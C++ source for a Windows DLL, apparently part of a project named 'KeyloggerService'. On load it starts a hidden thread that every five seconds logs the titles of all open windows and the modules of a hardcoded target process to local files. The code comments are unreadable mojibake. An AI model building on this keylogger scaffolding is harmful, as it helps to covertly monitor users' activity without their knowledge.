#include <Windows.h>
//#include <winternl.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <vector>
#include "defines.h"
#include <Windows.h>
#include <Psapi.h>
#include <iostream>

#define TRAVERSE_FLAG_DEBUG   (1u << 1)
#pragma comment (lib, "ntdll.lib")

HHOOK g_hHook;
HMODULE hLib;
NTSTATUS status;

DWORD dwCurrentProcessId;
HANDLE hCurrentProcess;
DWORD dwMainThreadId;

HWND window;

// ������� ������ ����
HWND FindWindowInService(DWORD serviceProcessId);

// ��������������� ������� ��� �������� ����
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

// ��������������� ��������� ������, ������� ����� ������������ � EnumWindowsProc
struct EnumWindowsData
{
    DWORD serviceProcessId; // ������������� �������� �������
    HWND targetWindow;      // ����� �������� ����
};

// ���������� ��������������� ������� ��� �������� ����
BOOL CALLBACK EnumWindowsProc2(HWND hwnd, LPARAM lParam)
{
    // �������� ������, ������� �������� � �������
    EnumWindowsData* data = (EnumWindowsData*)lParam;

    // �������� ������������� ��������, �������� ����������� ����
    DWORD windowProcessId = 0;
    GetWindowThreadProcessId(hwnd, &windowProcessId);

    // ���� ���� ����������� ������� ������������� �������� �� �������� � �������,
    // �� ��������� ��� ����� � ��������� ������ � ���������� FALSE, ����� ���������� �������
    if (windowProcessId == data->serviceProcessId)
    {
        data->targetWindow = hwnd;
        return FALSE;
    }

    // ���� ���� �� ��������, �� ���������� �������
    return TRUE;
}

// ���������� ������� ������ ����
HWND FindWindowInService(DWORD serviceProcessId)
{
    // �������� ������ ���� ���� �� ������� �����
    EnumWindowsData data;
    data.serviceProcessId = serviceProcessId;
    data.targetWindow = NULL;
    EnumWindows(EnumWindowsProc2, (LPARAM)&data);

    // ���������� ����� ���������� ���� (���� �������)
    return data.targetWindow;
}



BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    WCHAR windowTitle[MAX_PATH];
    if (GetWindowText(hwnd, windowTitle, sizeof(windowTitle))) {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!windowsdll.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << windowTitle << std::endl;
        }
    }
    return TRUE;
}

void getHandleWindow()
{
    window = NULL;
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!servicesdll.txt", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << "One\n" << std::endl;
    }


    //// �������� ������������� �������� ������ �������
    //DWORD serviceProcessId = GetCurrentProcessId();

    //// ���� ���� � ������ ������ �������
    //HWND targetWindow = FindWindowInService(serviceProcessId);

    HWND targetWindow = FindWindow(L"MyClass", KEYLOGGERWINDOW);
    outFile << "Two\n" << std::endl;
    // ���� ���� �������, �� ����� �������� � ��� �������
    if (targetWindow != NULL)
    {
        window = targetWindow;
    }

    outFile << "Three\n" << std::endl;

    EnumWindows(EnumWindowsProc, 0);

    outFile << "Four\n" << std::endl;

    HMODULE modules[1024];
    DWORD cbNeeded;

    DWORD targetProcessId = 1148; // ID ��������, � ������� �������� ����������
    HANDLE targetProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetProcessId);
    if (!targetProcess)
    {
        std::cout << "Failed to open target process." << std::endl;
        return;
    }

    if (EnumProcessModules(targetProcess, modules, sizeof(modules), &cbNeeded))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!modulesdll.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "One\n" << std::endl;
        }
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            wchar_t moduleName[MAX_PATH+1];
            if (GetModuleFileNameEx(targetProcess, modules[i], moduleName, sizeof(moduleName)))
            {
                outFile << moduleName << std::endl;
                //if (strstr(moduleName, "myLibrary.dll"))
                //{
                //    FARPROC getData = GetProcAddress(modules[i], "GetData");
                //    if (getData)
                //    {
                //        std::cout << "Found GetData() at address: " << getData << std::endl;
                //        // ����� ������� GetData() ������ ��������
                //        // ...
                //    }
                //}
            }
        }
        outFile.close();
    }

    outFile << "Five\n" << std::endl;

    ////HWND hWnd = FindWindow(NULL, _T("Window Title"));
    ////DWORD dwRemoteThreadId = GetWindowThreadProcessId(WorkerWindow, NULL);
    //DWORD dwThisThreadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    outFile << window << std::endl;
    //AttachThreadInput(dwThreadId, dwThisThreadId, TRUE);

    //// ������ ����� ���������� ��������� � ��������� ����

    ////AttachThreadInput(dwThreadId, dwThisThreadId, FALSE);

    if (outFile.is_open())outFile.close();
}

extern "C" __declspec(dllexport) HWND getHandle() {
    return window;
}

void DoTask()
{
    // ��������� ������ ��������
    getHandleWindow();
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    // ����������� ���� ������ ������
    while (true)
    {
        // ��������� ������
        DoTask();


        // �������� �� ��������� �����
        Sleep(5000);
    }

    return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (fdwReason == DLL_PROCESS_ATTACH)
        {
            // ������� ����� ����� ��� ���������� ������
            HANDLE hThread = CreateThread(NULL, 0, &ThreadProc, NULL, 0, NULL);
            if (!hThread)
                return FALSE;

            CloseHandle(hThread);
        }

        break;
    case DLL_PROCESS_DETACH:
        // ������� ���
        break;
    }
    return TRUE;
}